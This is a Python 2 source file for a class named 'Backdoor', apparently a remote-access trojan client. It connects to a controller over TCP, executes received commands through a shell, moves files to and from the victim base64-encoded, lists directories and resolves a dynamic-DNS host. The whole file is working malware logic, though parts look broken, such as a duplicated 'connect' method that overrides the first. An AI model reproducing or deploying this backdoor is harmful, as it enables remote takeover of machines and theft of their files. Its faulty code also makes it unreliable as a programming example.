import socket
import subprocess
import json
import sys,os
import platform
import base64
import shutil
import time
class Backdoor:
    def __init__(self,ip,port):
        self.ip =ip
        self.port = port
        self.getcurrent_filename = os.path.realpath(__name__)
        print self.getcurrent_filename
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connect(self.ip,self.port)
        # self.sock.send(json.dumps("[+] connected to client ",platform.machine()))
    def connect(self,ip,port):
        try:
            while True:
                    
                self.sock.connect((ip,port))
                self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.sock.connect((ip,port))
        except Exception:
            time.sleep(10)
            self.connect(self.ip,self.port)
            
    def cmd_processing(self,command):
        try:
            return subprocess.check_output(command,shell=True)
        except Exception:
            return "[-] command executing error!!"

    def change_working_dir(self,path):
        try:
            os.chdir(path)
            return "[+] changing working dirtory to ",path
        except Exception:
            return "[-] path do not exist ",path
    def read_file(self,filename):
        try:
                
            with open(filename,"rb") as f:
                return base64.b64encode(f.read())
        except Exception:
            return "[-] write file error"

    def write_file(self,filepath,content):
            with open(filepath,"wb") as file:
                try:
                    file.write(base64.b64decode(content))
                    return "[+] download complete!!"
                except:
                    return "[-] error download writing file!!"
    def recived_data(self):
        data = ""
        while True:
            try:
                data = data+ self.sock.recv(1024)
                return json.loads(data)
            except ValueError:
                continue
    def send_data(self,data):
        json_data = json.dumps(data)
        self.sock.send(json_data)
    def ddns(self):
        ip = socket.gethostbyname("name.ddns.net")
        return ip
    def search_dir(self,searchPath):
        dirp   = []
        dirna   = []
        fname  = []
        for dirpath,dirname,filename in os.walk(searchPath):
            dirp.append(dirpath)
            dirna.append(dirname)
            fname.append(filename)

        return {"dirpath":dirp,"dirname":dirna,"filename":fname}
    def connect(self):
        while True:
            try:

                result= self.recived_data()
                if "exist" in result:
                    sys.exit(0)
                if result[0]=="cd" and len(result)>1:
                    cmd_result =self.change_working_dir(result[1])

                elif result[0]=="upload" and len(result)>1:
                    cmd_result = self.write_file(result[1],result[2])

                elif result[0]=="download" and len(result)>1:
                    cmd_result= self.read_file(result[1])
                else:
                    cmd_result = self.cmd_processing(result)
            except Exception:
                cmd_result ="[-] gen -error"
            self.send_data(cmd_result)

    def close(self):
        self.sock.close()

    def movefile(self,src,des):
        try:
            shutil.move(src,des)
            return "moved"
        except:
            return "failed"

if "__main__"==__name__:
   backdoor= Backdoor("localhost",4001)
   backdoor.connect()
    